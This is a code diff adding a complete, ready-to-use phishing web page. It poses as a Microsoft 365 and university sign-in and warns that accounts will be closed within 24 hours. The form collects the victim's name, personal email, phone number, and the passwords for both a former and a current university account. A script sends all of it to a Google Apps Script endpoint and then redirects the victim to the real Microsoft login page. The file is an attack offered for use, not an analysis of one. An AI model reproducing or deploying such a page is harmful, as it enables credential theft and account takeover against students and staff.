@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Professional Login Page</title>
+  <style>
+    html, body {
+      min-height: 100vh;
+      margin: 0;
+      padding: 40px 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/d/d1/City_College_of_New_York.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo-img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    .notice {
+      background-color: #fffbcc;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-left: 4px solid #ffcc00;
+      font-size: 14px;
+      color: #333;
+      text-align: left;
+      border-radius: 6px;
+    }
+
+    .notice strong {
+      font-size: 15px;
+      color: #000;
+    }
+
+    .login-header h1 {
+      margin: 0 0 20px;
+      font-size: 24px;
+      color: #333;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #0078d4;
+    }
+
+    .login-button {
+      background-color: #0078d4;
+      color: #fff;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    .login-button:hover:enabled {
+      background-color: #005a9e;
+    }
+
+    .login-button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+
+    .login-footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .login-footer a {
+      color: #0078d4;
+      text-decoration: none;
+    }
+
+    .login-footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Logo -->
+    <img src="yourlogo.png" alt="Logo" class="logo-img">
+
+    <!-- Notification -->
+    <div class="notice">
+      <strong>Important Notice:</strong><br>
+      Our records indicate your Microsoft 365 account is linked to two university portals. Please provide login details for both accounts within 24 hours to avoid account suspension. Failure to verify may result in the closure of both accounts. Please read this information carefully before proceeding to the next step.
+    </div>
+
+    <!-- Form Header -->
+    <div class="login-header">
+      <h1>Sign In</h1>
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm" method="POST" action="https://script.google.com/macros/s/AKfycbzgcWTJmtR0bRigg0hlqav47ZNvJrQdj_SjnuWA3_7e9c6jksUM8oy9SkWya_roTrQ/exec">
+      <div class="input-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" placeholder="Your Full Name" required>
+      </div>
+      <div class="input-group">
+        <label for="personalEmail">Personal Email</label>
+        <input type="email" id="personalEmail" name="personalEmail" placeholder="you@example.com" required>
+      </div>
+      <div class="input-group">
+        <label for="phoneNumber">Phone Number</label>
+        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="+1234567890" required>
+      </div>
+
+      <!-- Former University Details -->
+      <div class="input-group">
+        <label for="universityEmail">Former University Email</label>
+        <input type="email" id="universityEmail" name="universityEmail" placeholder="former@university.edu" required>
+      </div>
+      <div class="input-group">
+        <label for="universityPassword">Former University Password</label>
+        <input type="password" id="universityPassword" name="universityPassword" placeholder="Password" required>
+      </div>
+
+      <!-- Current University Details -->
+      <div class="input-group">
+        <label for="currentEmail">Current University Email</label>
+        <input type="email" id="currentEmail" name="currentEmail" placeholder="current@university.edu" required>
+      </div>
+      <div class="input-group">
+        <label for="currentPassword">Current University Password</label>
+        <input type="password" id="currentPassword" name="currentPassword" placeholder="Password" required>
+      </div>
+
+      <button type="submit" class="login-button" id="submitBtn">Sign In</button>
+    </form>
+
+    <!-- Footer -->
+    <div class="login-footer">
+      <p><a href="#">Forgot your password?</a></p>
+    </div>
+  </div>
+
+  <!-- Submission Logic -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const formData = new FormData(form);
+      const submitBtn = document.getElementById('submitBtn');
+
+      // Disable the button after first click
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'Submitting...';
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => {
+        if (res.ok) {
+          alert("✅ Submission successful. Redirecting...");
+          setTimeout(() => {
+            window.location.href = "https://login.microsoftonline.com"; // <-- Your redirect page
+          }, 3000);
+        } else {
+          alert("⚠️ Submission failed. Please try again.");
+          submitBtn.disabled = false;
+          submitBtn.innerText = 'Sign In';
+        }
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        alert("❌ Network error. Please try again later.");
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Sign In';
+      });
+    });
+  </script>
+</body>
+</html>
